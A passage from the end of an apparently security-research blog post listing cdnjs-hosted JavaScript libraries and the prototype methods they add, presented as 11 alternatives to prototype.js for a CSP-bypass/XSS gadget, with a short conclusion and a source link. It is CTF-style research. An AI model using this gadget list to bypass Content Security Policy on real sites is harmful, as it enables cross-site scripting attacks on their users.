      <span class="token string">"Number.prototype.year"</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span>
    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/json-forms/1.6.3/js/brutusin-json-forms.min.js"</span><span class="token punctuation">,</span>
    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token string">"String.prototype.format"</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span>
    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/inheritance-js/0.4.12/inheritance.min.js"</span><span class="token punctuation">,</span>
    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token string">"Object.prototype.mix"</span><span class="token punctuation">,</span>
      <span class="token string">"Object.prototype.mixDeep"</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span>
    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/melonjs/1.0.1/melonjs.min.js"</span><span class="token punctuation">,</span>
    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token string">"Array.prototype.remove"</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span>
    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core-compat.min.js"</span><span class="token punctuation">,</span>
    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token string">"Array.prototype.erase"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.empty"</span><span class="token punctuation">,</span>
      <span class="token string">"Function.prototype.extend"</span><span class="token punctuation">,</span>
      <span class="token string">"Function.prototype.implement"</span><span class="token punctuation">,</span>
      <span class="token string">"Function.prototype.hide"</span><span class="token punctuation">,</span>
      <span class="token string">"Function.prototype.protect"</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span>
    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"</span><span class="token punctuation">,</span>
    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token string">"Array.prototype.erase"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.empty"</span><span class="token punctuation">,</span>
      <span class="token string">"Function.prototype.extend"</span><span class="token punctuation">,</span>
      <span class="token string">"Function.prototype.implement"</span><span class="token punctuation">,</span>
      <span class="token string">"Function.prototype.hide"</span><span class="token punctuation">,</span>
      <span class="token string">"Function.prototype.protect"</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span>
    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/opal/0.3.43/opal.min.js"</span><span class="token punctuation">,</span>
    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token string">"Array.prototype.$extend"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$to_proc"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$to_a"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$collect!"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$delete_if"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$each_index"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$fill"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$insert"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$keep_if"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$map!"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$push"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$shuffle"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$to_ary"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$unshift"</span><span class="token punctuation">,</span>
      <span class="token string">"String.prototype.$as_json"</span><span class="token punctuation">,</span>
      <span class="token string">"String.prototype.$extend"</span><span class="token punctuation">,</span>
      <span class="token string">"String.prototype.$intern"</span><span class="token punctuation">,</span>
      <span class="token string">"String.prototype.$to_sym"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.$as_json"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.$extend"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.$to_proc"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.$downto"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.$nonzero?"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.$ord"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.$times"</span><span class="token punctuation">,</span>
      <span class="token string">"Function.prototype.$include"</span><span class="token punctuation">,</span>
      <span class="token string">"Function.prototype.$module_function"</span><span class="token punctuation">,</span>
      <span class="token string">"Function.prototype.$extend"</span><span class="token punctuation">,</span>
      <span class="token string">"Function.prototype.$to_proc"</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span>
    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js"</span><span class="token punctuation">,</span>
    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token string">"Array.prototype.clear"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.times"</span><span class="token punctuation">,</span>
      <span class="token string">"Function.prototype.curry"</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span>
    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/tmlib.js/0.5.2/tmlib.min.js"</span><span class="token punctuation">,</span>
    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token string">"Array.prototype.swap"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.eraseAll"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.eraseIf"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.eraseIfAll"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.clear"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.shuffle"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.times"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.upto"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.downto"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.step"</span><span class="token punctuation">,</span>
      <span class="token string">"Object.prototype.$extend"</span><span class="token punctuation">,</span>
      <span class="token string">"Object.prototype.$safe"</span><span class="token punctuation">,</span>
      <span class="token string">"Object.prototype.$strict"</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Besides prototype.js, we have 11 other libraries that can be used.</p>
<h2><span id="conclusion">Conclusion</span></h2><p>By grabbing all the library information on cdnjs and using the headless browser to help verify, we have successfully found 11 alternatives to prototype.js. These libraries will add new methods on the prototype, and those methods will return <code>this</code> after calling it.</p>
<p>It took me a day or two to make this tiny project, because the data format is relatively simple, the verification method is also very simple, and the number is not really much. If you want to speed up, you can open a few more threads to run.</p>
<p>By the way, finding a replacement is mostly for fun, because it doesn’t make sense for a server to block <code>prototype.js</code> in particular(unless it’s a <a target="_blank" rel="noopener" href="https://challenge-0822.intigriti.io/">XSS challenge</a>).</p>
<p>Anyway, even it’s not that useful, it’s still a good and fun experience to do such research. At least, we know who pollues our prototype now.</p>
<p>Source code is available on GitHub: <a target="_blank" rel="noopener" href="https://github.com/aszx87410/cdnjs-prototype-pollution">https://github.com/aszx87410/cdnjs-prototype-pollution</a></p>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2022/09/29/en/css-injection-1/">Stealing Data with CSS - CSS Injection (Part 1)</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2022/08/29/en/intigriti-0822-xss-author-writeup/">Intigriti 0822 XSS Challenge Author Writeup</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">Comments</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2023 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>English</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2022/09/01/angularjs-csp-bypass-cdnjs/" class="dropdown-item">
                    繁體中文
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>